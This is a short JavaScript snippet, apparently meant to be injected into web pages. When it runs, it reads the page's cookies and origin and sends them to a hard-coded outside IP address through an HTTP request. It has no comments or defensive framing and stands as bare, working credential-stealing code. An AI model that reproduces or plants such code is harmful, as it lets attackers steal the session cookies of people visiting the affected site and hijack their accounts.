(function(window){
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
    httpRequest.send();
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            console.log(json);
        }
    };
}())
